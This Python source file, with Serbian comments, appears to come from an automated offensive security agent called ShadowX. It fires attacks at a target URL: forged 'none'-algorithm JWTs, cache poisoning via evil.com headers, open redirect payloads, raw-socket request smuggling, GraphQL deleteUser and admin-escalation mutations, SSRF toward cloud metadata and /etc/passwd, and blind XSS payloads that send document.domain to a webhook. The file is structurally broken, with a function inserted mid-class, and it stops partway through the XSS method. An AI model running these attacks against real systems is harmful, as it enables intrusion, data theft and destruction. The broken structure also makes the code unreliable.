# shadowfox/agents/shadowx_agent.py

import requests
import json
import jwt
import base64
import time
import hashlib
import threading
from urllib.parse import urlparse, parse_qs, urlencode, quote
from typing import Dict, List, Any, Optional
import concurrent.futures
import logging
from datetime import datetime, timedelta
import re
import socket
import struct

class ShadowXAgent:
    """
    ShadowX Agent - Specijalizovan za napredne napade:
    - JWT Manipulacija
    - Cache Poisoning  
    - Open Redirect Deep Test
    - HTTP Request Smuggling
    - GraphQL Injection
    - SSRF sa DNS Rebindingom
    - Blind XSS sa Webhook-om
    - DOM Clobbering
    - Prototype Pollution
    """
    
    def __init__(self):
        self.logger = logging.getLogger('ShadowXAgent')
        self.session = requests.Session()
        
        # Webhook URL za Blind XSS (moraš podesiti svoj)
        self.webhook_url = "https://webhook.site/your-unique-id"  # Zameniti sa pravim
        
        # DNS Rebinding domeni za SSRF
        self.rebinding_domains = [
            "localtest.me",
            "lvh.me", 
            "nip.io"
        ]
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })


    # agents/shadowx_agent.py

from types import SimpleNamespace

def agent_callback(task_data):
    if isinstance(task_data, dict):
        task_data = SimpleNamespace(**task_data)

    agent = ShadowXAgent()
    return agent.run(task_data)

    def analyze_and_attack(self, target_url: str, recon_data: Dict, mission_id: str = None) -> Dict:
        """
        Glavna funkcija - analizira uslove i izvršava odgovarajuće napade
        """
        if mission_id:

            self.mission_id = mission_id  # 
        self.logger.info(f"ShadowX Agent počinje napad na: {target_url}")
        
        results = {
            "target_url": target_url,
            "timestamp": datetime.now().isoformat(),
            "attacks_performed": [],
            "vulnerabilities_found": [],
            "attack_results": {}
        }
        
        try:
            # 1. JWT Manipulacija - ako postoji JWT
            if self._has_jwt_tokens(target_url, recon_data):
                jwt_results = self._attack_jwt(target_url, recon_data)
                results["attack_results"]["jwt"] = jwt_results
                if jwt_results.get("vulnerable"):
                    results["vulnerabilities_found"].append("JWT Manipulation")
                results["attacks_performed"].append("JWT Manipulation")
            
            # 2. Cache Poisoning - uvek testirati
            cache_results = self._attack_cache_poisoning(target_url)
            results["attack_results"]["cache_poisoning"] = cache_results
            if cache_results.get("vulnerable"):
                results["vulnerabilities_found"].append("Cache Poisoning")
            results["attacks_performed"].append("Cache Poisoning")
            
            # 3. Open Redirect Deep Test
            redirect_results = self._attack_open_redirect_deep(target_url, recon_data)
            results["attack_results"]["open_redirect"] = redirect_results
            if redirect_results.get("vulnerable"):
                results["vulnerabilities_found"].append("Open Redirect")
            results["attacks_performed"].append("Open Redirect Deep Test")
            
            # 4. HTTP Request Smuggling
            smuggling_results = self._attack_request_smuggling(target_url)
            results["attack_results"]["request_smuggling"] = smuggling_results
            if smuggling_results.get("vulnerable"):
                results["vulnerabilities_found"].append("HTTP Request Smuggling")
            results["attacks_performed"].append("HTTP Request Smuggling")
            
            # 5. GraphQL Injection - ako ima GraphQL endpoint
            if self._has_graphql(target_url, recon_data):
                graphql_results = self._attack_graphql(target_url, recon_data)
                results["attack_results"]["graphql"] = graphql_results
                if graphql_results.get("vulnerable"):
                    results["vulnerabilities_found"].append("GraphQL Injection")
                results["attacks_performed"].append("GraphQL Injection")
            
            # 6. SSRF sa DNS Rebindingom
            ssrf_results = self._attack_ssrf_dns_rebinding(target_url, recon_data)
            results["attack_results"]["ssrf_dns"] = ssrf_results
            if ssrf_results.get("vulnerable"):
                results["vulnerabilities_found"].append("SSRF DNS Rebinding")
            results["attacks_performed"].append("SSRF DNS Rebinding")
            
            # 7. Blind XSS sa Webhook-om
            blind_xss_results = self._attack_blind_xss(target_url, recon_data)
            results["attack_results"]["blind_xss"] = blind_xss_results
            if blind_xss_results.get("vulnerable"):
                results["vulnerabilities_found"].append("Blind XSS")
            results["attacks_performed"].append("Blind XSS")
            
            # 8. DOM Clobbering
            dom_clobbering_results = self._attack_dom_clobbering(target_url)
            results["attack_results"]["dom_clobbering"] = dom_clobbering_results
            if dom_clobbering_results.get("vulnerable"):
                results["vulnerabilities_found"].append("DOM Clobbering")
            results["attacks_performed"].append("DOM Clobbering")
            
            # 9. Prototype Pollution
            prototype_pollution_results = self._attack_prototype_pollution(target_url, recon_data)
            results["attack_results"]["prototype_pollution"] = prototype_pollution_results
            if prototype_pollution_results.get("vulnerable"):
                results["vulnerabilities_found"].append("Prototype Pollution")
            results["attacks_performed"].append("Prototype Pollution")
            
            # Log rezultate
            self.operator.log_agent_action("ShadowXAgent", "advanced_attacks_completed", {
                "attacks_performed": len(results["attacks_performed"]),
                "vulnerabilities_found": len(results["vulnerabilities_found"]),
                "target": target_url
            })
            
            self.logger.info(f"ShadowX napad završen. Pronađeno {len(results['vulnerabilities_found'])} ranjivosti")
            
        except Exception as e:
            self.logger.error(f"Greška u ShadowX napadu: {e}")
            results["error"] = str(e)
        
        return results

    def _has_jwt_tokens(self, target_url: str, recon_data: Dict) -> bool:
        """Proverava da li aplikacija koristi JWT tokene"""
        try:
            response = self.session.get(target_url, timeout=10)
            
            # Traži JWT u cookies, localStorage referenciama, ili header-ima
            jwt_indicators = [
                'jwt', 'token', 'bearer', 'authorization',
                'eyJ0eXAiOiJKV1QiLCJhbGciOi',  # JWT header base64
                'localStorage.setItem',
                'sessionStorage.setItem'
            ]
            
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            for indicator in jwt_indicators:
                if indicator in content or indicator in headers:
                    return True
                    
            return False
        except:
            return False

    def _attack_jwt(self, target_url: str, recon_data: Dict) -> Dict:
        """JWT Manipulacija napadi"""
        results = {"vulnerable": False, "attacks": [], "details": []}
        
        try:
            # Pokušaj da dobije JWT token
            response = self.session.get(target_url)
            
            # Traži JWT u odgovoru
            jwt_patterns = [
                r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*',
                r'"token":\s*"([^"]*)"',
                r'"jwt":\s*"([^"]*)"'
            ]
            
            jwt_token = None
            for pattern in jwt_patterns:
                match = re.search(pattern, response.text)
                if match:
                    jwt_token = match.group() if 'eyJ' in pattern else match.group(1)
                    break
            
            if not jwt_token:
                return results
                
            # JWT Attack 1: None Algorithm
            none_token = self._create_none_algorithm_jwt(jwt_token)
            if self._test_jwt_token(target_url, none_token):
                results["vulnerable"] = True
                results["attacks"].append("None Algorithm Bypass")
                results["details"].append(f"None algorithm JWT accepted: {none_token[:50]}...")
            
            # JWT Attack 2: Algorithm Confusion (RS256 to HS256)
            hs256_token = self._create_algorithm_confusion_jwt(jwt_token)
            if hs256_token and self._test_jwt_token(target_url, hs256_token):
                results["vulnerable"] = True
                results["attacks"].append("Algorithm Confusion (RS256->HS256)")
                results["details"].append(f"Algorithm confusion successful")
            
            # JWT Attack 3: Weak Secret Brute Force
            if self._brute_force_jwt_secret(jwt_token):
                results["vulnerable"] = True
                results["attacks"].append("Weak Secret")
                results["details"].append("JWT secret successfully brute forced")
                
            # JWT Attack 4: Claims Manipulation
            manipulated_token = self._manipulate_jwt_claims(jwt_token)
            if manipulated_token and self._test_jwt_token(target_url, manipulated_token):
                results["vulnerable"] = True
                results["attacks"].append("Claims Manipulation")
                results["details"].append("JWT claims successfully manipulated")
                
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _create_none_algorithm_jwt(self, original_token: str) -> str:
        """Kreira JWT sa 'none' algoritmom"""
        try:
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
                
            # Decode header i payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Menja algoritam na 'none'
            header['alg'] = 'none'
            
            # Encode header i payload
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # None algoritam = nema signature
            return f"{new_header}.{new_payload}."
            
        except:
            return None

    def _attack_cache_poisoning(self, target_url: str) -> Dict:
        """Cache Poisoning napadi"""
        results = {"vulnerable": False, "attacks": [], "details": []}
        
        cache_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Host", "evil.com"),
            ("X-Forwarded-Server", "evil.com"),
            ("X-HTTP-Host-Override", "evil.com"),
            ("Forwarded", "host=evil.com"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Original-URL", "/admin"),
            ("X-Override-URL", "/admin")
        ]
        
        try:
            # Baseline zahtev
            baseline = self.session.get(target_url, timeout=10)
            
            for header_name, header_value in cache_headers:
                try:
                    headers = {header_name: header_value}
                    response = self.session.get(target_url, headers=headers, timeout=10)
                    
                    # Proverava da li se header reflektuje u odgovoru
                    if (header_value in response.text or 
                        header_value in str(response.headers) or
                        response.text != baseline.text):
                        
                        results["vulnerable"] = True
                        results["attacks"].append(f"Cache Poisoning via {header_name}")
                        results["details"].append(f"Header {header_name}: {header_value} reflected or changed response")
                        
                        # Store proof
                        self.operator.store_proof(
                            payload=f"{header_name}: {header_value}",
                            url=target_url,
                            payload_type="Cache Poisoning",
                            response_code=response.status_code,
                            response_raw=response.text[:1000]
                        )
                        
                except Exception as e:
                    continue
                    
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _attack_open_redirect_deep(self, target_url: str, recon_data: Dict) -> Dict:
        """Napredni Open Redirect testovi"""
        results = {"vulnerable": False, "attacks": [], "details": []}
        
        # Napredni payloads za Open Redirect
        redirect_payloads = [
            "//evil.com",
            "///evil.com", 
            "////evil.com",
            "https://evil.com",
            "http://evil.com",
            "//evil.com%2f..",
            "//evil.com%2f%2e%2e",
            "//evil.com%252f%252e%252e",
            "javascript://evil.com/%0aalert(1)",
            "data:text/html,<script>alert(1)</script>",
            "//evil.com\\.example.com",
            "//evil.com@example.com",
            "//evil.com#example.com",
            "//evil.com?example.com",
            "//3555754572",  # IP in decimal
            "//0xd3e55b3c",  # IP in hex
            "//0321.0326.0133.0174",  # IP in octal
            "file:///etc/passwd",
            "mailto:test@evil.com",
            "ftp://evil.com"
        ]
        
        # Parametri koji često sadrže redirect
        redirect_params = ['redirect', 'url', 'next', 'goto', 'return', 'continue', 'r', 'dest', 'destination']
        
        try:
            parsed_url = urlparse(target_url)
            
            for param in redirect_params:
                for payload in redirect_payloads:
                    try:
                        # Test različite pozicije parametra
                        test_urls = [
                            f"{target_url}{'&' if '?' in target_url else '?'}{param}={quote(payload)}",
                            f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param}={quote(payload)}",
                        ]
                        
                        for test_url in test_urls:
                            response = self.session.get(test_url, allow_redirects=False, timeout=5)
                            
                            if response.status_code in [301, 302, 303, 307, 308]:
                                location = response.headers.get('Location', '')
                                
                                # Proverava da li redirect vodi ka našem payload-u
                                if ('evil.com' in location or 
                                    payload.replace('//', '') in location or
                                    'javascript:' in location.lower() or
                                    'data:' in location.lower()):
                                    
                                    results["vulnerable"] = True
                                    results["attacks"].append(f"Open Redirect via {param}")
                                    results["details"].append(f"Parameter {param} with payload {payload} redirects to: {location}")
                                    
                                    # Store proof
                                    self.operator.store_proof(
                                        payload=f"{param}={payload}",
                                        url=test_url,
                                        payload_type="Open Redirect",
                                        response_code=response.status_code,
                                        response_raw=f"Location: {location}"
                                    )
                                    
                    except Exception:
                        continue
                        
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _attack_request_smuggling(self, target_url: str) -> Dict:
        """HTTP Request Smuggling napadi"""
        results = {"vulnerable": False, "attacks": [], "details": []}
        
        try:
            parsed_url = urlparse(target_url)
            host = parsed_url.netloc
            path = parsed_url.path or '/'
            
            # CL.TE (Content-Length vs Transfer-Encoding)
            cl_te_payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 13\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"SMUGGLED"
            )
            
            # TE.CL (Transfer-Encoding vs Content-Length)
            te_cl_payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 3\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"8\r\n"
                f"SMUGGLED\r\n"
                f"0\r\n"
                f"\r\n"
            )
            
            # TE.TE (Dual Transfer-Encoding)
            te_te_payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Transfer-encoding: cow\r\n"
                f"\r\n"
                f"5c\r\n"
                f"SMUGGLED\r\n"
                f"0\r\n"
                f"\r\n"
            )
            
            smuggling_payloads = [
                ("CL.TE", cl_te_payload),
                ("TE.CL", te_cl_payload), 
                ("TE.TE", te_te_payload)
            ]
            
            for attack_type, payload in smuggling_payloads:
                try:
                    # Pošalji raw HTTP zahtev
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    if parsed_url.scheme == 'https':
                        import ssl
                        context = ssl.create_default_context()
                        sock = context.wrap_socket(sock, server_hostname=parsed_url.hostname)
                    
                    sock.connect((parsed_url.hostname, parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)))
                    sock.send(payload.encode())
                    
                    response = b""
                    sock.settimeout(5)
                    try:
                        while True:
                            chunk = sock.recv(1024)
                            if not chunk:
                                break
                            response += chunk
                    except socket.timeout:
                        pass
                    
                    sock.close()
                    
                    response_str = response.decode(errors='ignore')
                    
                    # Proverava znakove request smuggling-a
                    smuggling_indicators = [
                        "400 Bad Request",
                        "Transfer-Encoding",
                        "Content-Length",
                        "chunked",
                        "SMUGGLED"
                    ]
                    
                    for indicator in smuggling_indicators:
                        if indicator in response_str:
                            results["vulnerable"] = True
                            results["attacks"].append(f"Request Smuggling {attack_type}")
                            results["details"].append(f"Potential {attack_type} smuggling detected")
                            break
                            
                except Exception:
                    continue
        
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _has_graphql(self, target_url: str, recon_data: Dict) -> bool:
        """Proverava da li postoji GraphQL endpoint"""
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/query', '/api/query']
        
        for endpoint in graphql_endpoints:
            try:
                test_url = target_url.rstrip('/') + endpoint
                response = self.session.post(test_url, 
                    json={"query": "{__typename}"}, 
                    timeout=5)
                
                if (response.status_code == 200 and 
                    ('data' in response.text or 'errors' in response.text or 'graphql' in response.text.lower())):
                    return True
            except:
                continue
                
        return False

    def _attack_graphql(self, target_url: str, recon_data: Dict) -> Dict:
        """GraphQL Injection napadi"""
        results = {"vulnerable": False, "attacks": [], "details": []}
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql']
        
        # GraphQL payloads
        graphql_payloads = [
            # Introspection query
            {"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"},
            
            # Depth-based DoS
            {"query": "query { user { profile { user { profile { user { profile { user { profile { user { profile { id } } } } } } } } } } }"},
            
            # Field duplication
            {"query": "query { __typename __typename __typename __typename __typename }"},
            
            # Mutation attempts
            {"query": "mutation { deleteUser(id: 1) { id } }"},
            {"query": "mutation { updateUser(id: 1, admin: true) { id admin } }"},
        ]
        
        try:
            for endpoint in graphql_endpoints:
                test_url = target_url.rstrip('/') + endpoint
                
                for payload in graphql_payloads:
                    try:
                        response = self.session.post(test_url, json=payload, timeout=10)
                        
                        if response.status_code == 200:
                            response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                            
                            # Introspection successful
                            if '__schema' in str(response_data):
                                results["vulnerable"] = True
                                results["attacks"].append("GraphQL Introspection")
                                results["details"].append("GraphQL schema introspection allowed")
                                
                            # Depth attack successful (error or timeout)
                            elif 'depth' in response.text.lower() or response.elapsed.total_seconds() > 5:
                                results["vulnerable"] = True
                                results["attacks"].append("GraphQL Depth Attack")
                                results["details"].append("GraphQL depth-based DoS possible")
                                
                            # Mutation successful
                            elif 'deleteUser' in str(payload) and 'errors' not in str(response_data):
                                results["vulnerable"] = True
                                results["attacks"].append("GraphQL Mutation")
                                results["details"].append("Dangerous GraphQL mutations allowed")
                                
                            # Store successful attacks
                            if results["vulnerable"]:
                                self.operator.store_proof(
                                    payload=json.dumps(payload),
                                    url=test_url,
                                    payload_type="GraphQL Injection",
                                    response_code=response.status_code,
                                    response_raw=response.text[:1000]
                                )
                                
                    except Exception:
                        continue
                        
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _attack_ssrf_dns_rebinding(self, target_url: str, recon_data: Dict) -> Dict:
        """SSRF sa DNS Rebinding napadima"""
        results = {"vulnerable": False, "attacks": [], "details": []}
        
        # SSRF payloads sa DNS rebinding
        ssrf_payloads = [
            "http://127.0.0.1:80/admin",
            "http://localhost:22/",
            "http://192.168.1.1/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://127.0.0.1:3000/",
            "http://127.0.0.1:8080/admin",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            f"http://localtest.me.{urlparse(target_url).netloc}/admin",
            f"http://127.0.0.1.{urlparse(target_url).netloc}/",
            "gopher://127.0.0.1:6379/_INFO",  # Redis
            "dict://127.0.0.1:11211/",  # Memcached
            "ftp://127.0.0.1/",
            "file:///etc/passwd",
            "file:///proc/version",
        ]
        
        # Parametri koji često koriste URL-ove
        url_params = ['url', 'link', 'src', 'source', 'target', 'redirect', 'proxy', 'fetch', 'download']
        
        try:
            for param in url_params:
                for payload in ssrf_payloads:
                    try:
                        # Test kao GET parametar
                        test_url = f"{target_url}{'&' if '?' in target_url else '?'}{param}={quote(payload)}"
                        response = self.session.get(test_url, timeout=10)
                        
                        # Proverava SSRF indikatore
                        ssrf_indicators = [
                            "Connection refused",
                            "Connection timed out", 
                            "No route to host",
                            "Permission denied",
                            "401 Unauthorized",
                            "403 Forbidden",
                            "SSH-",  # SSH banner
                            "200 OK",  # Successful internal request
                            "apache",
                            "nginx", 
                            "admin",
                            "login",
                            "dashboard",
                            "instance-id",  # AWS metadata
                            "project-id"   # GCP metadata
                        ]
                        
                        response_text = response.text.lower()
                        for indicator in ssrf_indicators:
                            if indicator.lower() in response_text:
                                results["vulnerable"] = True
                                results["attacks"].append(f"SSRF via {param}")
                                results["details"].append(f"SSRF detected with payload: {payload}")
                                
                                # Store proof
                                self.operator.store_proof(
                                    payload=f"{param}={payload}",
                                    url=test_url,
                                    payload_type="SSRF DNS Rebinding",
                                    response_code=response.status_code,
                                    response_raw=response.text[:1000]
                                )
                                break
                                
                        # Test kao POST podatak
                        post_data = {param: payload}
                        response = self.session.post(target_url, data=post_data, timeout=10)
                        
                        response_text = response.text.lower()
                        for indicator in ssrf_indicators:
                            if indicator.lower() in response_text:
                                results["vulnerable"] = True
                                results["attacks"].append(f"SSRF POST via {param}")
                                results["details"].append(f"SSRF POST detected with payload: {payload}")
                                break
                                
                    except Exception:
                        continue
                        
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _attack_blind_xss(self, target_url: str, recon_data: Dict) -> Dict:
        """Blind XSS sa webhook napadima"""
        results = {"vulnerable": False, "attacks": [], "details": []}
        
        # Unique identifier za ovaj test
        unique_id = hashlib.md5(f"{target_url}{time.time()}".encode()).hexdigest()[:8]
        
        # Blind XSS payloads sa webhook
        xss_payloads = [
            f"<script>fetch('{self.webhook_url}?blind_xss_{unique_id}='+document.domain)</script>",
            f"<img src=x onerror=fetch('{self.webhook_url}?blind_xss_{unique_id}='+document.domain)>",
            f"<svg onload=fetch('{self.webhook_url}?blind_xss_{unique_id}='+document.domain)></svg>",
            f"javascript:fetch('{self.webhook_url}?blind_xss_{unique_id}='+document.domain)",
            f"<script>new Image().src='{self.webhook_url}?blind_xss_{unique_id}='+document.domain</script>",
            f"<script>document.write('<img src=\"{self.webhook_url}?blind_xss_{unique_id}=\"+document.domain>')</script>",
            f"<iframe src=javascript:fetch('{self.webhook_url}?blind_xss_{unique_id}='+document.domain)></iframe>",
        ]
